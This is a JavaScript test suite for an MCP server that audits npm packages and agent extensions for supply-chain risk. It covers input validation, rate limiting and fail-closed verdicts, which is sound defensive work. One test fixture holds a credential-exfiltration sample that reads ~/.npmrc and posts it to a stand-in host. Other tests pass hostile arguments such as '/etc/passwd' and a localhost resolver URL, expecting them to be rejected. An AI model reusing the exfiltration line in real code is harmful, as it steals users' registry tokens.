import test from 'node:test';
import assert from 'node:assert/strict';
import worker, { readJson, checkMetadata } from '../src/index.mjs';

const env = { PUBLIC_ORIGIN: 'https://mcp.pkgxray.ca', MCP_RATE_LIMITER: { limit: async () => ({ success: true }) },
  SCAN_RATE_LIMITER: { limit: async () => ({ success: true }) } };
const headers = { 'content-type':'application/json', accept:'application/json, text/event-stream' };
function request(message, extra = {}) {
  return new Request('https://mcp.pkgxray.ca/mcp', { method:'POST', headers, body:JSON.stringify(message), ...extra });
}
const call = (name, args) => ({ jsonrpc:'2.0',id:1,method:'tools/call',params:{name,arguments:args} });
const audit = args => call('audit_agent_extension_supply_chain',args);
const send = (message, options = {}) => worker.fetch(request(message, options), env);

test('initialization and tool discovery advertise only the two static tools', async () => {
  const r = await (await send({jsonrpc:'2.0',id:1,method:'initialize',params:{protocolVersion:'2025-11-25',capabilities:{},clientInfo:{name:'test',version:'1'}}})).json();
  assert.equal(r.result.protocolVersion,'2025-11-25');
  const list = await (await send({jsonrpc:'2.0',id:2,method:'tools/list'})).json();
  assert.deepEqual(list.result.tools.map(t=>t.name),['audit_agent_extension_supply_chain','check_npm_package_metadata']);
  for (const tool of list.result.tools) assert.equal(tool.annotations.readOnlyHint,true);
});
test('notifications return empty 202; GET and DELETE do not open sessions',async()=>{
  assert.equal((await send({jsonrpc:'2.0',method:'notifications/initialized'})).status,202);
  for(const method of ['GET','DELETE']) assert.equal((await worker.fetch(new Request('https://mcp.pkgxray.ca/mcp',{method}),env)).status,405);
});
test('benign supplied source never authorizes installation',async()=>{
  const r=await(await send(audit({sourceFiles:{'index.js':'module.exports=42;'}}))).json();
  assert.equal(r.result.structuredContent.verdict,'block');
  assert.equal(r.result.structuredContent.installationApproved,false);
  assert.equal(r.result.structuredContent.coverage.artifactVerified,false);
  assert.ok(r.result.structuredContent.resolution.reasonCodes.includes('incomplete-checks'));
  assert.match(r.result.structuredContent.summary,/not a confirmed malware finding/);
  assert.doesNotMatch(JSON.stringify(r.result.structuredContent), /"verdict":"review"|reviewPlan|Proceed|Decline/);
});
test('credential-exfiltration evidence is detected without execution',async()=>{
  const r=await(await send(audit({sourceFiles:{'index.js':`const fs=require('fs');const secret=fs.readFileSync(process.env.HOME+'/.npmrc','utf8');fetch('https://example.invalid/collect',{method:'POST',body:secret});`}}))).json();
  assert.equal(r.result.structuredContent.verdict,'block');
  assert.equal(r.result.structuredContent.coverage.executed,false);
  assert.ok(r.result.structuredContent.resolution.reasonCodes.includes('security-findings'));
});
test('tool arguments cannot request execution, arbitrary fetch or filesystem access',async()=>{
  for(const args of [{sourceFiles:{a:'x'},archive:'/etc/passwd'},{sourceFiles:{a:'x'},allowExecution:true},{sourceFiles:{a:'x'},resolverUrl:'http://127.0.0.1'}]) {
    const r=await(await send(audit(args))).json();assert.equal(r.error.code,-32602);
  }
  const r=await(await send(call('run_vm',{command:'id'}))).json();assert.equal(r.error.code,-32602);
});
test('source shape, length, count and prototype names are bounded',async()=>{
  for(const sourceFiles of [[],{}, {a:17}, {a:'x'.repeat(17000)}, Object.fromEntries(Array.from({length:17},(_,i)=>[`${i}.js`,'x'])),JSON.parse('{"__proto__":"x"}')]) {
    const r=await(await send(audit({sourceFiles}))).json();assert.equal(r.error.code,-32602);
  }
});
test('hostile origins and protocol versions are rejected; allowed origin receives CORS',async()=>{
  const ping={jsonrpc:'2.0',id:1,method:'ping'};
  assert.equal((await send(ping,{headers:{...headers,origin:'https://evil.example'}})).status,403);
  assert.equal((await send(ping,{headers:{...headers,'mcp-protocol-version':'invalid'}})).status,400);
  const r=await send(ping,{headers:{...headers,origin:'https://chatgpt.com'}});
  assert.equal(r.headers.get('access-control-allow-origin'),'https://chatgpt.com');
});
test('oversized and invalid JSON, batches and malformed IDs are rejected',async()=>{
  for(const body of ['{','x'.repeat(25000),JSON.stringify([{jsonrpc:'2.0',id:1,method:'ping'}]),JSON.stringify({jsonrpc:'2.0',id:{a:1},method:'ping'})]) {
    assert.ok([400,413].includes((await worker.fetch(new Request('https://mcp.pkgxray.ca/mcp',{method:'POST',headers,body}),env)).status));
  }
});
test('content type, accept and compression cannot bypass the transport',async()=>{
  const message={jsonrpc:'2.0',id:1,method:'ping'};
  for(const h of [{...headers,'content-type':'text/plain'},{...headers,accept:'application/json'},{...headers,'content-encoding':'gzip'}]) {
    assert.ok([406,413,415].includes((await send(message,{headers:h})).status));
  }
});
test('both rate limiters fail closed',async()=>{
  const message=audit({sourceFiles:{a:'x'}});
  assert.equal((await worker.fetch(request(message),{})).status,503);
  for(const binding of ['MCP_RATE_LIMITER','SCAN_RATE_LIMITER']) {
    const denied={...env,[binding]:{limit:async()=>({success:false})}};
    assert.equal((await worker.fetch(request(message),denied)).status,429);
    assert.equal((await worker.fetch(request(message),{...env,[binding]:{limit:async()=>{throw Error('unavailable');}}})).status,503);
  }
});
test('metadata accepts exact npm identities only',async()=>{
  for(const args of [{name:'http://127.0.0.1',version:'1.0.0'},{name:'foo',version:'latest'},{name:'../foo',version:'1.0.0'},{name:'foo',version:'1.0.0',url:'https://example.com'}]) {
    const r=await(await send(call('check_npm_package_metadata',args))).json();assert.equal(r.error.code,-32602);
  }
});
test('metadata calls fixed hosts, disallows redirects, filters withdrawn advisories',async()=>{
  const urls=[];
  const report=await checkMetadata({name:'@fixture/pkg',version:'1.0.0'},async(url,options)=>{
    urls.push(url);assert.equal(options.redirect,'manual');assert.ok(options.signal);
    return Response.json(url.includes('registry.npmjs.org')?{name:'@fixture/pkg',version:'1.0.0',dist:{tarball:'http://127.0.0.1'}}:
      {vulns:[{id:'TEST-1'},{id:'TEST-WITHDRAWN',withdrawn:'2020-01-01'}]});
  });
  assert.equal(urls.length,2);assert.equal(report.verdict,'block');assert.deepEqual(report.advisories.map(v=>v.id),['TEST-1']);
  assert.equal(report.checks.source,'not-performed');
});
test('empty advisories, upstream failures, identity mismatches never return safe',async()=>{
  for(const fetcher of [async()=>Response.json({}),async()=>new Response('redirect',{status:302}),async()=>{throw Error('offline');}]) {
    const r=await checkMetadata({name:'fixture',version:'1.0.0'},fetcher);
    assert.equal(r.verdict,'block');assert.equal(r.installationApproved,false);assert.equal(r.checks.registry,'unavailable');
  }
});
test('streaming limits apply without Content-Length, and slow bodies time out',async()=>{
  const stream=new ReadableStream({start(c){c.enqueue(new Uint8Array(1025));c.close();}});
  await assert.rejects(readJson(stream,1024),/size limit/);
  await assert.rejects(readJson(new ReadableStream(),1024,10),/deadline/);
});
test('query strings are rejected to avoid source/credential leakage in URL logs',async()=>{
  assert.equal((await worker.fetch(new Request('https://mcp.pkgxray.ca/mcp?source=secret'),env)).status,400);
});

async function bounded(promise) {
  let timer;
  try { return await Promise.race([promise, new Promise((_, reject) => { timer = setTimeout(() => reject(Error('cleanup stalled')), 250); })]); }
  finally { clearTimeout(timer); }
}
test('body deadline and byte-limit rejection do not await stalled stream cleanup',async()=>{
  const never = () => new Promise(() => {});
  await assert.rejects(bounded(readJson(new ReadableStream({ cancel: never }), 1024, 10)), /deadline/);
  const oversized = new ReadableStream({ start(c) { c.enqueue(new Uint8Array(1025)); }, cancel: never });
  await assert.rejects(bounded(readJson(oversized, 1024)), /size limit/);
});
test('upstream error bodies with stalled cleanup do not stall metadata results',async()=>{
  const r = await bounded(checkMetadata({name:'fixture',version:'1.0.0'}, async () =>
    new Response(new ReadableStream({ cancel() { return new Promise(() => {}); } }), { status: 503 })));
  assert.equal(r.checks.registry,'unavailable'); assert.equal(r.checks.vulnerabilities,'unavailable');
  assert.equal(r.verdict,'block'); assert.equal(r.installationApproved,false);
});
test('source budget counts UTF-8 bytes, invalid arguments do not consume scan quota',async()=>{
  let scans = 0;
  const metered = { ...env, SCAN_RATE_LIMITER: { limit: async () => { scans++; return { success: true }; } } };
  const r = await worker.fetch(request(audit({ sourceFiles: { 'index.js': '💥'.repeat(4200) } })), metered);
  assert.equal((await r.json()).error.code, -32602); assert.equal(scans, 0);
});
test('malformed advisory records never produce a completed clean lookup',async()=>{
  for (const body of [null, [], {vulns:null}, {vulns:'none'}, {vulns:[null]}, {vulns:[{id:42}]}]) {
    const r=await checkMetadata({name:'fixture',version:'1.0.0'},async url=>Response.json(url.includes('registry.npmjs.org')?{name:'fixture',version:'1.0.0'}:body));
    assert.equal(r.checks.vulnerabilities,'unavailable'); assert.equal(r.verdict,'block'); assert.equal(r.installationApproved,false);
  }
});

test('successful advisory-free metadata remains blocked for absent source/artifact checks',async()=>{
  const report=await checkMetadata({name:'fixture',version:'1.0.0'},async url=>Response.json(
    url.includes('registry.npmjs.org')?{name:'fixture',version:'1.0.0'}:{vulns:[]}));
  assert.equal(report.verdict,'block');assert.equal(report.installationApproved,false);
  assert.equal(report.checks.registry,'completed');assert.equal(report.checks.vulnerabilities,'completed');
  assert.ok(report.resolution.reasonCodes.includes('source-artifact-checks-not-performed'));
  assert.match(report.summary,/not a confirmed malware finding/);
  assert.deepEqual(report.resolution.retry,{registry:{attempted:false,attempts:0},vulnerabilities:{attempted:false,attempts:0}});
});

test('one transient metadata retry preserves endpoint, request identity and deadline signal',async()=>{
  const seen=new Map();
  const report=await checkMetadata({name:'fixture',version:'1.0.0'},async(url,options)=>{
    const previous=seen.get(url);
    if(!previous){seen.set(url,{body:options.body,signal:options.signal,calls:1});return new Response(null,{status:503});}
    previous.calls++;assert.equal(options.body,previous.body);assert.equal(options.signal,previous.signal);
    assert.equal(options.redirect,'manual');
    return Response.json(url.includes('registry.npmjs.org')?{name:'fixture',version:'1.0.0'}:{vulns:[]});
  });
  assert.equal(seen.size,2);assert.ok([...seen.values()].every(value=>value.calls===2));
  assert.equal(report.checks.registry,'completed');assert.equal(report.checks.vulnerabilities,'completed');
  assert.equal(report.verdict,'block');
  assert.deepEqual(report.resolution.retry,{registry:{attempted:true,attempts:1},vulnerabilities:{attempted:true,attempts:1}});
});

test('metadata retry exhaustion blocks and deterministic failures never retry',async()=>{
  for(const status of [302,404,503]){
    let calls=0;
    const report=await checkMetadata({name:'fixture',version:'1.0.0'},async()=>{calls++;return new Response(null,{status});});
    assert.equal(calls,status===503?4:2);assert.equal(report.verdict,'block');
    assert.ok(report.resolution.reasonCodes.includes('metadata-check-incomplete'));
  }
  let calls=0;
  const report=await checkMetadata({name:'fixture',version:'1.0.0'},async()=>{calls++;return Response.json({vulns:'malformed'});});
  assert.equal(calls,2);assert.equal(report.verdict,'block');
  assert.equal(report.checks.vulnerabilities,'unavailable');
});

test('retry cannot extend the upstream deadline, including a fetch that ignores abort',async()=>{
  let calls=0;
  const report=await bounded(checkMetadata({name:'fixture',version:'1.0.0'},async()=>{
    calls++;if(calls<=2)return new Response(null,{status:503});return new Promise(()=>{});
  },{timeoutMs:10}));
  assert.equal(calls,4);assert.equal(report.verdict,'block');
  assert.equal(report.checks.registry,'unavailable');assert.equal(report.checks.vulnerabilities,'unavailable');
  assert.ok(Object.values(report.resolution.retry).every(value=>value.attempts===1));
  await assert.rejects(checkMetadata({name:'fixture',version:'1.0.0'},()=>{throw Error('must not run');},{timeoutMs:6001}),/1\.\.6000/);
});

test('hosted tools reject retired manual-review inputs before consuming scan quota',async()=>{
  let scans=0;
  const metered={...env,SCAN_RATE_LIMITER:{limit:async()=>{scans++;return{success:true};}}};
  for(const extra of [{reviewId:'old'},{reviewChoice:'Proceed'},{reviewPlan:{}},{timeoutMs:60000}]){
    const response=await worker.fetch(request(audit({sourceFiles:{'index.js':'exports.x=1'},...extra})),metered);
    assert.equal((await response.json()).error.code,-32602);
  }
  assert.equal(scans,0);
});
